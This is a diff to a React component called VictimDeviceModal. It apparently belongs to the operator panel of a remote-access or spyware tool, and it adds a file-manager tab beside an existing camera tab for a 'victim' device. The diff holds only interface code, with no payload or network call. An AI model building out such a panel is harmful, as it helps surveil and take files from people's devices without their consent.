@@ -21,11 +21,13 @@ import {
     MicRecord24Filled,
     PeopleCommunity24Filled,
 } from '@fluentui/react-icons';
+import { observer } from 'mobx-react-lite';
 import React, { useState } from 'react';
 
 import { VictimOrder } from '../../../common/enums';
 import { type VictimDeviceStore } from '../../store/VictimDeviceStore';
 import { CameraTab } from './CameraTab';
+import { FileManagerTab } from './FileManagerTab';
 
 interface IProps {
     data?: VictimDeviceStore;
@@ -37,7 +39,7 @@ export interface ITabProps {
     data: VictimDeviceStore;
 }
 
-export const VictimDeviceModal: React.FC<IProps> = (props) => {
+export const VictimDeviceModal: React.FC<IProps> = observer((props) => {
     const [selectedTab, setSelectedTab] = useState(VictimOrder.CAMERA);
 
     return (
@@ -116,10 +118,12 @@ export const VictimDeviceModal: React.FC<IProps> = (props) => {
                         {props.data !== undefined &&
                             (selectedTab === VictimOrder.CAMERA ? (
                                 <CameraTab data={props.data} />
+                            ) : selectedTab === VictimOrder.FILE_MANAGER ? (
+                                <FileManagerTab data={props.data} />
                             ) : null)}
                     </DialogContent>
                 </DialogBody>
             </DialogSurface>
         </Dialog>
     );
-};
+});
